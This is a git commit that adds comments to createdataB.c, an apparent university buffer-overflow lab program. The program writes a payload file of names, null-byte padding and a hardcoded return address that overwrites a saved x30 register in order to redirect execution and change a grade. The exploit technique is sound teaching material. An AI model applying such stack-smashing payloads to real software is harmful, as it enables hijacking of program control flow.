81b2e906cd8dbab1109e4d544c7feeb38b3bbcb7
Owen Clarke <oc8825@princeton.edu>
2025-04-29 12:45:00 -0400

    commenting createdataB.c

--- createdataB.c
+++ createdataB.c
@@ -1,27 +1,43 @@
+/*
+   createdataB.c
+   Ben Zhou and Owen Clarke
+*/
+
+/*
+   Produces a file called dataB with the student name's Ben Zhou and
+   Owen Clarke, a nullbyte, more null bytes as padding to overrun the
+   stack, and the address of the instruction in main to get a B, the
+   latter of which will overwrite getName's stored x30
+*/
+
 #include <stdio.h>
 
+/*
+   main does not accept any command-line arguments or read from stdin,
+   but writes to dataB as described in the file comment above
+*/
 int main(void)
 {
     FILE *psFile;
     int i;
+    /* Address of the instruction in TEXT to change the grade to a B */
     unsigned long returnAddr = 0x400890;
 
     psFile = fopen("dataB", "w");
 
-    /* 24 characters */
+    /* Student names: 24 bytes */
     fprintf(psFile, "Ben Zhou and Owen Clarke");
 
-    /* Terminating null byte */
+    /* Terminating null byte: 1 byte */
     putc('\0', psFile);
 
     /* 23 more null bytes to fill up 48 bytes of buffer */
     for (i = 0; i < 23; i++)
         putc('\0', psFile);
 
-    /* Return address for changing grade to B */
+    /* Overwritten return address */
     fwrite(&returnAddr, sizeof(unsigned long), 1, psFile);
 
     fclose(psFile);
-
     return 0;
 }
